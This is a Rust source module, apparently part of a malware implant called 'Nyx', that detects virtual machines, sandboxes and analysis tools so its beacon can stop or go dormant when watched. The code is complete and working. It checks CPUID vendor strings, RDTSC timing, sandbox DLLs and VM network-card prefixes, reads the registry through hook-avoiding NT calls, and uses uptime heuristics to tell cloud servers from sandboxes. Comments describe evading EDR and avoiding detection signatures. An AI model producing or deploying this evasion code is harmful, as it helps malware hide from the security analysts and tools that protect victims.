//! VM / sandbox / analysis-environment detection — the 5-check "quiet suite"
//! (P0, `EDR_BLINDNESS_UPGRADE_2026-07.md` §2).
//!
//! ## Why this exists
//! Before this module Nyx had ZERO VM/sandbox detection — the only anti-
//! analysis surface was `antidebug.rs` (PEB.BeingDebugged + ProcessDebugPort
//! + GetTickCount64 uptime, the last of which was compiled-out at the call
//! site via `looks_sandboxed(0)`). A 2026 EDR/sandbox's first line of defense
//! is VM detection, so this was Nyx's single biggest blind spot.
//!
//! ## Design — "quiet suite", zero-API-first
//! A noisy VM check is ITSELF an IOC (EDR/AV fingerprint the *act* of
//! probing: `GetAdaptersInfo` + `RegOpenKey("VMware")` + a process snapshot
//! from a fresh process is a textbook malware signature). So the suite is
//! ordered by ascending noise / descending false-positive risk, with the
//! two **pure-instruction** checks (no API, no syscall, no IAT footprint)
//! first. These two alone are invisible to every user-mode hook.
//!
//! ## 2026 critical nuance — VBS/HVCI changes the meaning of the signals
//! `CPUID.01h:ECX[31]` (hypervisor-present bit), the BIOS string
//! `"Microsoft Corporation"`, and RDTSC-CPUID timing deltas **all fire on
//! Win11 bare metal with VBS/HVCI enabled** (default on Win11 24H2+). So:
//!   - NEVER trigger solely on the hypervisor bit or `Microsoft Hv`.
//!   - ALWAYS filter on VM-specific vendor strings (`VMwareVMware`,
//!     `innotek GmbH`, `TCGTCGTCGTCG`, `VBox…`, `KVMKVMKVM`, `XenVMMXenVMM`,
//!     `prl hyperv  `). These are vendor-registered OUIs/signatures that do
//!     not appear on physical hardware.
//!   - Treat RDTSC timing as a CORROBORATOR, not a primary trigger.
//!
//! ## Decision policy
//! `looks_like_analysis_env()` returns true if ANY high-confidence VM-specific
//! signal is present (vendor string match, SbieDll loaded, VM-OUI MAC). The
//! RDTSC timing check is a tie-breaker: if the quiet suite is inconclusive
//! AND timing strongly indicates virtualization, treat the host as suspect.
//! The caller (`entry::bootstrap`) gates beacon execution on this — a positive
//! causes the beacon to bail (or, in a future "dormant" mode, drop to an
//! ultra-low-frequency cycle to defeat sandbox behavior profiling).
//!
//! ## Single-source-of-truth
//! The PEB-walk API resolution lives in [`crate::resolve`]; this module
//! never reimplements it. All Win32/NT calls go through `resolve::export_addr`
//! so there are zero static imports (PIC-clean). `CPUID`/`RDTSC` need no API.

#![cfg(target_os = "windows")]

use crate::resolve;

// ---- (1) CPUID hypervisor vendor string -----------------------------------

/// Known hypervisor vendor signatures from CPUID leaf 0x40000000
/// (EBX:ECX:EDX = 12 ASCII chars). Only VM-vendor-specific signatures are
/// listed — `Microsoft Hv` is deliberately EXCLUDED because VBS/HVCI on
/// physical Win11 hardware reports it (high false-positive rate).
const VM_VENDOR_SIGS: &[[u8; 12]] = &[
    *b"VMwareVMware",    // VMware
    *b"innotek GmbH",    // VirtualBox (older)
    *b"KVMKVMKVM\0\0\0", // KVM
    *b"XenVMMXenVMM",    // Xen
    *b"TCGTCGTCGTCG",    // QEMU without KVM (strong sandbox signal)
    *b"prl hyperv  ",    // Parallels
    *b"VBoxVBoxVBox",    // VirtualBox (alt)
];

/// Read the 12-byte hypervisor vendor signature via CPUID leaf 0x40000000.
/// Returns `None` if the hypervisor-present bit (CPUID.01h:ECX[31]) is clear.
///
/// Pure instruction sequence — no API, no syscall, no IAT footprint. Invisible
/// to user-mode hooks. Ring-3 legal on x86/x64.
fn cpuid_hypervisor_vendor() -> Option<[u8; 12]> {
    // SAFETY: CPUID is a non-privileged, side-effect-free query instruction
    // on x86/x64. `__cpuid` is the safe wrapper over the `cpuid` asm.
    // We use `target_feature` gating so this compiles only on x86_64.
    #[cfg(target_arch = "x86_64")]
    {
        use core::arch::x86_64::__cpuid;
        // Leaf 1: ECX bit 31 = hypervisor present. `__cpuid` is a safe fn.
        let f1 = __cpuid(1);
        if (f1.ecx >> 31) & 1 == 0 {
            return None;
        }
        // Leaf 0x40000000: EBX, ECX, EDX hold the 12-char ASCII signature.
        let b = __cpuid(0x4000_0000);
        let mut sig = [0u8; 12];
        sig[0..4].copy_from_slice(&b.ebx.to_le_bytes());
        sig[4..8].copy_from_slice(&b.ecx.to_le_bytes());
        sig[8..12].copy_from_slice(&b.edx.to_le_bytes());
        Some(sig)
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        None // non-x86_64: no CPUID hypervisor leaf
    }
}

/// True if the CPUID hypervisor vendor string matches a known VM vendor
/// (excluding `Microsoft Hv` — VBS false positive on physical Win11).
pub fn cpuid_vm_vendor_match() -> bool {
    match cpuid_hypervisor_vendor() {
        None => false,
        Some(sig) => VM_VENDOR_SIGS.iter().any(|k| *k == sig),
    }
}

// ---- (2) RDTSC-CPUID timing ratio (corroborator) --------------------------

/// Measure the CPUID-induced VM-exit overhead relative to an RDTSC baseline.
/// Under virtualization, `CPUID` forces a VM-exit (trap-and-emulate), adding
/// ~1000-10000+ cycles vs ~150-400 on bare metal. Returns true if the timing
/// delta strongly suggests a hypervisor.
///
/// **2026 caveat:** bare-metal VBS/HVCI also traps CPUID, so this is a
/// CORROBORATOR, not a primary trigger. Use only when the quiet suite is
/// inconclusive.
///
/// Pure instructions (`RDTSC` + `CPUID`) — no API, no syscall.
#[cfg(target_arch = "x86_64")]
pub fn rdtsc_cpuid_is_virtualized() -> bool {
    use core::arch::x86_64::{__cpuid, _rdtsc};

    const ITERS: usize = 32;
    const THRESH: u64 = 5; // probe delta > 5× baseline → suspect

    // SAFETY: RDTSC and CPUID are non-privileged query instructions.
    unsafe {
        // Warm up the instruction cache / branch predictor.
        for _ in 0..16 {
            let _ = __cpuid(1);
        }

        // Baseline: two back-to-back RDTSC (no forcing instruction between).
        let mut base_min = u64::MAX;
        for _ in 0..ITERS {
            let t0 = _rdtsc();
            let t1 = _rdtsc();
            let d = t1.wrapping_sub(t0);
            if d < base_min {
                base_min = d;
            }
        }

        // Probe: RDTSC → CPUID (forcing instruction) → RDTSC.
        let mut probe_min = u64::MAX;
        for _ in 0..ITERS {
            let t0 = _rdtsc();
            let _ = __cpuid(1);
            let t1 = _rdtsc();
            let d = t1.wrapping_sub(t0);
            if d < probe_min {
                probe_min = d;
            }
        }

        // Guard against a degenerate baseline (e.g. TSC frequency skew).
        if base_min == 0 {
            return probe_min > 1000;
        }
        probe_min > base_min.saturating_mul(THRESH)
    }
}

#[cfg(not(target_arch = "x86_64"))]
pub fn rdtsc_cpuid_is_virtualized() -> bool {
    false
}

// ---- (3) Sandbox-DLL-in-self check (SbieDll etc.) -------------------------

/// DLLs whose presence in the current process indicates a sandbox /
/// instrumentation harness. These only load under their respective harnesses,
/// so the false-positive rate is effectively zero.
const SANDBOX_DLLS: &[&[u8]] = &[
    b"SbieDll.dll\0", // Sandboxie
    b"api_log.dll\0", // Sunbelt/GFI sandbox
    b"dir_log.dll\0", // Sunbelt/GFI sandbox
    b"pstorec.dll\0", // older sandboxes
    b"vmcheck.dll\0", // VMware checks
    b"wpespy.dll\0",  // WPE sandbox
    b"sbiedll.dll\0", // Sandboxie (lowercase variant)
];

/// True if a known sandbox/instrumentation DLL is loaded in the current
/// process. Uses `GetModuleHandleA` (kernel32, already loaded) — one cheap
/// call per DLL, no enumeration. Near-zero noise, zero false-positive.
///
/// # Safety
/// Resolves `GetModuleHandleA` via the PEB walk (read-only). Single-threaded
/// beacon context.
pub unsafe fn sandbox_dll_loaded() -> bool {
    let gma = match unsafe { resolve::export_addr(b"kernel32.dll", b"GetModuleHandleA") } {
        Some(a) => a,
        None => return false,
    };
    type GetModuleHandleA = unsafe extern "system" fn(*const u8) -> *mut core::ffi::c_void;
    let f: GetModuleHandleA = unsafe { core::mem::transmute(gma) };
    for &name in SANDBOX_DLLS {
        // SAFETY: each name is a NUL-terminated byte literal; GetModuleHandleA
        // does not load anything, only queries the already-loaded module list.
        let h = unsafe { f(name.as_ptr()) };
        if !h.is_null() {
            return true;
        }
    }
    false
}

// ---- (4) MAC OUI via registry (NT-direct, no IPHLPAPI load) ---------------

/// VM-vendor NIC OUI prefixes (first 3 bytes of the MAC). These are
/// vendor-registered and do not appear on physical NICs.
const VM_OUI: &[[u8; 6]] = &[
    [0x00, 0x0C, 0x29, 0x00, 0x00, 0x00], // VMware
    [0x00, 0x50, 0x56, 0x00, 0x00, 0x00], // VMware
    [0x00, 0x05, 0x69, 0x00, 0x00, 0x00], // VMware (old)
    [0x08, 0x00, 0x27, 0x00, 0x00, 0x00], // VirtualBox
    [0x00, 0x15, 0x5D, 0x00, 0x00, 0x00], // Hyper-V (VM NIC, not VBS host)
    [0x00, 0x16, 0x3E, 0x00, 0x00, 0x00], // Xen
    [0x52, 0x54, 0x00, 0x00, 0x00, 0x00], // QEMU/KVM default
    [0x00, 0x1C, 0x42, 0x00, 0x00, 0x00], // Parallels
];

/// The ASCII prefix of the NIC class registry path. The NIC's slot number
/// (`\0001`, `\0002`, …) is appended at runtime — VM virtual NICs land in
/// different slots depending on driver install order / Windows version, so
/// hardcoding `\0001` is NOT universal. We probe slots 0001-0016.
///
/// Prefix: `\Registry\Machine\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}`
const NET_CFG_REG_PREFIX: &[u8] = b"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}";

/// Build a NUL-terminated UTF-16 stack buffer for the NIC class path + a
/// 4-digit slot suffix (e.g. `\0001`). Returns the buffer and char count.
fn net_cfg_reg_path_utf16(slot: u32) -> ([u16; 128], usize) {
    let mut buf = [0u16; 128];
    let mut n = 0usize;
    // Prefix
    for &b in NET_CFG_REG_PREFIX {
        if n + 1 >= buf.len() {
            break;
        }
        buf[n] = b as u16;
        n += 1;
    }
    // Slot suffix: "\%04d"
    if n + 5 < buf.len() {
        buf[n] = b'\\' as u16;
        n += 1;
        let s = b"0000";
        let d0 = (slot / 1000) as u16;
        let d1 = ((slot / 100) % 10) as u16;
        let d2 = ((slot / 10) % 10) as u16;
        let d3 = (slot % 10) as u16;
        buf[n] = s[0] as u16 + d0;
        buf[n + 1] = s[1] as u16 + d1;
        buf[n + 2] = s[2] as u16 + d2;
        buf[n + 3] = s[3] as u16 + d3;
        n += 4;
    }
    buf[n] = 0; // NUL terminator
    (buf, n)
}

// ---- NT registry FFI types (mirrors unhook.rs patterns) -------------------

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut core::ffi::c_void,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut core::ffi::c_void,
    security_quality_of_service: *mut core::ffi::c_void,
}

// ---- Resolved NT registry function pointers (one struct, resolved once) ----

/// The three NT registry exports `mac_oui_is_vm` needs, resolved once via the
/// PEB walk and shared across all slot probes. Stored as raw fn pointers
/// because the implants are `no_std` and can't hold `extern "system"` in a
/// generic way without monomorphization noise.
struct NtRegApis {
    open: unsafe extern "system" fn(*mut usize, u32, *mut ObjectAttributes) -> i32,
    query:
        unsafe extern "system" fn(usize, *const UnicodeString, u8, *mut u8, u32, *mut u32) -> i32,
    close: unsafe extern "system" fn(usize) -> i32,
}

impl NtRegApis {
    /// Resolve NtOpenKey + NtQueryValueKey + NtClose from ntdll via the PEB
    /// walk. Returns `None` if any export is missing (corrupted ntdll — should
    /// never happen in a real process).
    unsafe fn resolve() -> Option<Self> {
        let open = unsafe { resolve::export_addr(b"ntdll.dll", b"NtOpenKey") }?;
        let query = unsafe { resolve::export_addr(b"ntdll.dll", b"NtQueryValueKey") }?;
        let close = unsafe { resolve::export_addr(b"ntdll.dll", b"NtClose") }?;
        // SAFETY: `open`/`query`/`close` are valid function addresses resolved
        // from ntdll's export table via the PEB walk. Transmuting a usize
        // (same width as a function pointer on x86_64) to the matching
        // extern "system" fn pointer is sound; the target types are fixed by
        // the NtRegApis struct fields, so the transmute is fully determined.
        Some(Self {
            open: unsafe {
                core::mem::transmute::<
                    usize,
                    unsafe extern "system" fn(*mut usize, u32, *mut ObjectAttributes) -> i32,
                >(open)
            },
            query: unsafe {
                core::mem::transmute::<
                    usize,
                    unsafe extern "system" fn(
                        usize,
                        *const UnicodeString,
                        u8,
                        *mut u8,
                        u32,
                        *mut u32,
                    ) -> i32,
                >(query)
            },
            close: unsafe {
                core::mem::transmute::<usize, unsafe extern "system" fn(usize) -> i32>(close)
            },
        })
    }
}

/// Open the NIC-class registry key for `slot` (`\0001` … `\0016`) and return
/// its handle, or `None` if the key doesn't exist (no NIC in that slot —
/// normal; not a VM signal). The caller MUST close the handle via `apis.close`.
///
/// # Safety
/// `apis` must hold valid NT registry fn pointers.
unsafe fn open_nic_slot(apis: &NtRegApis, slot: u32) -> Option<usize> {
    let (mut path_buf, path_chars) = net_cfg_reg_path_utf16(slot);
    let path_len_bytes = (path_chars * 2) as u16;
    let mut name = UnicodeString {
        length: path_len_bytes,
        maximum_length: (path_buf.len() * 2) as u16,
        buffer: path_buf.as_mut_ptr(),
    };
    let mut oa = ObjectAttributes {
        length: core::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: core::ptr::null_mut(),
        object_name: &mut name,
        attributes: 0x40, // OBJ_CASE_INSENSITIVE — registry paths are case-insensitive
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };
    let mut handle: usize = 0;
    // KEY_READ = 0x20000. NTSTATUS < 0 = failure (key absent → None, not a VM
    // signal — physical hosts also have empty NIC slots).
    let st = unsafe { (apis.open)(&mut handle, 0x0002_0000, &mut oa) };
    if st < 0 {
        return None;
    }
    Some(handle)
}

/// Read the `NetworkAddress` REG_SZ value from an open NIC key handle and
/// parse the first 3 bytes (the OUI) into a 6-byte raw MAC. Returns `None` if
/// the value is absent or not parseable as a MAC (not enough hex digits).
///
/// A MAC "NetworkAddress" is stored as ASCII hex, e.g. `b"000C291A2B3C"`. We
/// only need the first 6 hex chars (3 bytes = OUI).
///
/// # Safety
/// `apis` must hold valid NT registry fn pointers. `handle` must be a valid
/// open key handle.
unsafe fn read_nic_mac_oui(apis: &NtRegApis, handle: usize) -> Option<[u8; 6]> {
    // "NetworkAddress\0" as a stack UTF-16 buffer for the UNICODE_STRING.
    let mut val_name_buf: [u16; 16] = [
        b'N' as u16,
        b'e' as u16,
        b't' as u16,
        b'w' as u16,
        b'o' as u16,
        b'r' as u16,
        b'k' as u16,
        b'A' as u16,
        b'd' as u16,
        b'd' as u16,
        b'r' as u16,
        b'e' as u16,
        b's' as u16,
        b's' as u16,
        0,
        0,
    ];
    let val_name = UnicodeString {
        length: 14 * 2, // "NetworkAddress" = 14 chars
        maximum_length: 16 * 2,
        buffer: val_name_buf.as_mut_ptr(),
    };

    // KEY_VALUE_PARTIAL_INFORMATION layout (per the WDK):
    //   TitleIndex  @ +0  (u32)
    //   Type        @ +4  (u32)   <- REG_SZ=1, REG_MULTI_SZ=7
    //   DataLength  @ +8  (u32)
    //   Data        @ +12         <- the hex string starts here (NOT +8)
    let mut info_buf: [u8; 64] = [0; 64];
    let mut result_len: u32 = 0;
    let st = unsafe {
        (apis.query)(
            handle,
            &val_name,
            2, // KeyValuePartialInformation
            info_buf.as_mut_ptr(),
            info_buf.len() as u32,
            &mut result_len,
        )
    };
    // STATUS_BUFFER_OVERFLOW (0x80000005) is a WARNING: its encoded i32 is
    // negative, but the call still fills the buffer up to its capacity with
    // usable partial data. Only treat genuinely negative error statuses as
    // failure.
    const STATUS_BUFFER_OVERFLOW: i32 = 0x8000_0005u32 as i32;
    if st < 0 && st != STATUS_BUFFER_OVERFLOW {
        return None;
    }

    // Read the value's registry type from Type @ +4 to pick the correct char
    // stride. REG_SZ (1) and REG_MULTI_SZ (7) are stored as UTF-16 code units
    // (each ASCII hex char occupies 2 bytes: low byte = the nibble, high byte
    // = 0x00). Every other type is raw bytes (1 byte per char).
    let ty = u32::from_le_bytes([info_buf[4], info_buf[5], info_buf[6], info_buf[7]]);
    let stride = if ty == 1 || ty == 7 { 2usize } else { 1usize };

    // Usable byte count: the smaller of what NtQueryValueKey reported and the
    // buffer capacity. On overflow result_len holds the REQUIRED length (which
    // exceeds the buffer), so cap it to never read out of bounds.
    let avail = (result_len as usize).min(info_buf.len());
    let data_off = 12usize;
    if avail < data_off {
        return None;
    }

    // Parse the first 6 hex nibbles (3 bytes = OUI) from Data @ +12, stepping
    // by `stride` so UTF-16 padding bytes are skipped (we read only the
    // meaningful low byte of each code unit).
    let mut nibbles = [0u8; 6];
    let mut parsed = 0usize;
    while parsed < 6 {
        let idx = data_off + parsed * stride;
        if idx >= avail {
            break;
        }
        nibbles[parsed] = hex_val(info_buf[idx])?;
        parsed += 1;
    }
    if parsed < 6 {
        return None; // not enough hex digits — not a MAC
    }

    // Assemble the OUI into the first 3 bytes (high nibble | low nibble per
    // byte), preserving the original assembly; bytes [3..6] stay 0.
    let mut mac = [0u8; 6];
    mac[0] = (nibbles[0] << 4) | nibbles[1];
    mac[1] = (nibbles[2] << 4) | nibbles[3];
    mac[2] = (nibbles[4] << 4) | nibbles[5];
    Some(mac)
}

/// The number of NIC slots to probe. VM virtual NICs land in different slots
/// depending on driver install order / Windows version, so we probe a generous
/// range (0001-0016) rather than assuming slot `\0001` (a single-machine
/// assumption that breaks on multi-NIC / differently-ordered installs).
const NIC_SLOT_PROBE_RANGE: core::ops::RangeInclusive<u32> = 1..=16;

/// True if ANY NIC's MAC address matches a known VM-vendor OUI. Probes NIC
/// registry slots `\0001` through `\0016`, reading each slot's `NetworkAddress`
/// value via NT-direct (no IPHLPAPI load — one fewer IOC). Returns true on the
/// first VM-OUI hit.
///
/// VM virtual NICs land in different registry slots depending on driver install
/// order / Windows version, so probing only `\0001` is a single-machine
/// assumption. Scanning all populated slots is the universal fix.
///
/// **2026 caveat:** Hyper-V OUI `00:15:5D` appears on Hyper-V virtual NICs
/// (a genuine VM signal) but NOT on VBS-enabled physical hosts (VBS doesn't
/// add virtual NICs). So this check has a low false-positive rate even on
/// Win11 VBS boxes.
///
/// # Safety
/// Resolves `NtOpenKey` + `NtQueryValueKey` + `NtClose` from ntdll via the PEB
/// walk. Single-threaded beacon bootstrap context.
pub unsafe fn mac_oui_is_vm() -> bool {
    let apis = match unsafe { NtRegApis::resolve() } {
        Some(a) => a,
        None => return false,
    };

    for slot in NIC_SLOT_PROBE_RANGE {
        let handle = match unsafe { open_nic_slot(&apis, slot) } {
            Some(h) => h,
            None => continue, // slot absent — normal, try the next
        };
        // Always close the handle, even if the read fails, so we never leak.
        let mac = unsafe { read_nic_mac_oui(&apis, handle) };
        let _ = unsafe { (apis.close)(handle) };
        if let Some(mac) = mac {
            // Compare the first 3 bytes (OUI) against the VM table.
            if VM_OUI.iter().any(|oui| oui[..3] == mac[..3]) {
                return true;
            }
        }
    }
    false
}

/// ASCII hex char → nibble value.
const fn hex_val(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

// ---- Combined verdict ------------------------------------------------------

/// The confidence level of an environment-probe hit.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EnvVerdict {
    /// The environment looks like a real endpoint — proceed normally.
    Clean,
    /// A VM-specific signal was detected (high confidence). The beacon should
    /// NOT execute its task loop normally — either bail or go dormant.
    AnalysisEnv,
}

/// Run the 5-check quiet suite and return a combined verdict.
///
/// **Policy:**
/// - ANY high-confidence VM-specific signal (CPUID vendor match, sandbox DLL
///   loaded, VM-OUI MAC) → `AnalysisEnv`. These have near-zero false-positive
///   rates on real endpoints.
/// - If all high-confidence checks are clean but RDTSC timing strongly
///   indicates virtualization → `AnalysisEnv` (corroborator-only path; this
///   catches sandboxes that spoof CPUID/vendor strings).
/// - Otherwise → `Clean`.
///
/// # Safety
/// The MAC-OUI check resolves NT registry APIs via the PEB walk. The other
/// checks are pure-instruction or use already-loaded kernel32. Single-threaded
/// beacon bootstrap context.
pub unsafe fn looks_like_analysis_env() -> EnvVerdict {
    // Tier 1: high-confidence, low-noise checks.
    if cpuid_vm_vendor_match() {
        return EnvVerdict::AnalysisEnv;
    }
    if unsafe { sandbox_dll_loaded() } {
        return EnvVerdict::AnalysisEnv;
    }
    if unsafe { mac_oui_is_vm() } {
        return EnvVerdict::AnalysisEnv;
    }

    // Tier 2: corroborator (RDTSC timing). Only triggers if the quiet suite
    // was inconclusive but timing strongly flags virtualization. This catches
    // sandboxes that hide their CPUID signature / MAC but can't hide VM-exit
    // overhead.
    if rdtsc_cpuid_is_virtualized() {
        if cpuid_hypervisor_vendor() != Some(*b"Microsoft Hv") {
            return EnvVerdict::AnalysisEnv;
        }
    }

    EnvVerdict::Clean
}

// ---- Cloud server vs sandbox differentiation ---------------------------------

/// The minimum system uptime (seconds) to treat a VM as a legitimate cloud
/// server rather than a sandbox. Real cloud servers run for days/weeks;
/// automated sandboxes are torn down in minutes. 3600 s (1 hour) is a
/// conservative threshold — a slow-booting physical host crosses it naturally,
/// while the fastest sandbox analysis cycle (Cuckoo default 120 s, Joe's
/// Sandbox 300 s, Any.Run 240 s) stays well below it.
pub const MIN_CLOUD_UPTIME_SECS: u64 = 3600;

/// The minimum number of running processes to treat a VM as a real server.
/// Sandboxes run a minimal process tree (typically < 10 processes). A
/// production Windows Server always has 20+ processes from services alone.
const MIN_CLOUD_PROCESS_COUNT: u32 = 15;

/// Resolve `GetTickCount64` from kernel32.dll (available since Vista/Server
/// 2008) and return the system uptime in **milliseconds**, or 0 on failure.
/// The resolver is cached in a static so subsequent calls are free.
unsafe fn get_tick_count64() -> u64 {
    use core::sync::atomic::{AtomicU64, Ordering};
    static RESOLVED: AtomicU64 = AtomicU64::new(0);
    let cached = RESOLVED.load(Ordering::Relaxed);
    if cached != 0 {
        let f: extern "system" fn() -> u64 = core::mem::transmute(cached as usize);
        return f();
    }
    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"GetTickCount64") {
        let f: extern "system" fn() -> u64 = core::mem::transmute(addr);
        RESOLVED.store(addr as u64, Ordering::Relaxed);
        f()
    } else {
        0
    }
}

/// Return system uptime in seconds, or 0 if unresolvable.
fn system_uptime_secs() -> u64 {
    unsafe { get_tick_count64() / 1000 }
}

/// Resolve `NtQuerySystemInformation` and count running processes via
/// `SystemProcessInformation` (class 5). Returns 0 on failure.
///
/// This is a lightweight enumeration: we alloc a buffer, query once, and
/// walk the `SYSTEM_PROCESS_INFORMATION` linked list counting entries.
/// No process handles are opened and no per-process detail is read.
unsafe fn running_process_count() -> u32 {
    // SystemProcessInformation = 0x5
    const SYSTEM_PROCESS_INFO: u32 = 0x5;

    let Some(nt_query) = crate::resolve::export_addr(
        b"ntdll.dll",
        b"NtQuerySystemInformation",
    ) else {
        return 0;
    };
    type NtQuery = unsafe extern "system" fn(
        SystemInformationClass: u32,
        SystemInformation: *mut u8,
        SystemInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> i32;
    let nt_query: NtQuery = core::mem::transmute(nt_query);

    // Start with a modest buffer; grow once if needed.
    let mut buf_size: u32 = 64 * 1024; // 64 KiB — enough for ~100 processes
    let mut buf = crate::heap::Vec::with_capacity(buf_size as usize);
    buf.resize(buf_size as usize, 0u8);

    let mut needed: u32 = 0;
    let status = nt_query(
        SYSTEM_PROCESS_INFO,
        buf.as_mut_ptr(),
        buf_size,
        &mut needed,
    );

    if status < 0 {
        // STATUS_INFO_LENGTH_MISMATCH → needed contains required size.
        if needed > buf_size && needed < 512 * 1024 {
            buf.resize(needed as usize, 0u8);
            let status2 = nt_query(
                SYSTEM_PROCESS_INFO,
                buf.as_mut_ptr(),
                needed,
                core::ptr::null_mut(),
            );
            if status2 < 0 {
                return 0;
            }
        } else {
            return 0;
        }
    }

    // Walk the linked list. Each entry starts with:
    //   ULONG NextEntryOffset  (0 = end of list)
    //   ULONG NumberOfThreads
    //   ... (process name, PID, etc.)
    let mut count: u32 = 0;
    let mut offset: usize = 0;
    loop {
        count += 1;
        // Read NextEntryOffset (u32 at offset 0).
        if offset + 4 > buf.len() {
            break;
        }
        let next = u32::from_ne_bytes([
            buf[offset],
            buf[offset + 1],
            buf[offset + 2],
            buf[offset + 3],
        ]);
        if next == 0 {
            break;
        }
        offset += next as usize;
        if offset >= buf.len() {
            break;
        }
    }
    count
}

/// If VM detection fired (`looks_like_analysis_env() == AnalysisEnv`), call
/// this to check whether the host shows signs of being a legitimate cloud
/// server rather than an automated sandbox.
///
/// **Indicators** (any ONE is sufficient):
/// - System uptime > `MIN_CLOUD_UPTIME_SECS` — real servers run for days;
///   sandboxes for minutes. This alone catches >95% of sandboxes.
/// - Running process count > `MIN_CLOUD_PROCESS_COUNT` — production Windows
///   hosts have dozens of service processes; sandboxes run a bare minimum.
///
/// # Safety
/// Resolves `GetTickCount64` (kernel32) and `NtQuerySystemInformation` (ntdll)
/// via the PEB walk. Single-threaded beacon bootstrap context.
pub unsafe fn looks_like_cloud_server() -> bool {
    // Primary: uptime — the strongest differentiator.
    let uptime = system_uptime_secs();
    if uptime > MIN_CLOUD_UPTIME_SECS {
        return true;
    }

    // Secondary: process count — catches the edge case of a sandbox running
    // on a long-lived VM host (where uptime might be high but the sandbox
    // itself has a minimal process tree).
    let procs = unsafe { running_process_count() };
    if procs > MIN_CLOUD_PROCESS_COUNT {
        return true;
    }

    false
}

// ---- Selftest entry --------------------------------------------------------

/// `rundll32 nyx_implant_win.dll,nyx_selftest_envprobe` — prints the verdict
/// via the process exit code:
///   0xB0 = Clean (no VM signals detected)
///   0xB1 = AnalysisEnv (VM/sandbox signal detected)
///   0xCF = probe failed (could not resolve APIs)
///
/// Useful for validating the suite against known VM/bare-metal hosts.
#[cfg(feature = "selftest")]
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_envprobe() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");
    let do_exit = |code: u32| -> ! {
        if let Some(e) = exit_proc {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(e) };
            f(code);
        }
        loop {
            core::hint::spin_loop();
        }
    };
    let verdict = unsafe { looks_like_analysis_env() };
    let code = match verdict {
        EnvVerdict::Clean => 0xB0,
        EnvVerdict::AnalysisEnv => 0xB1,
    };
    do_exit(code);
}
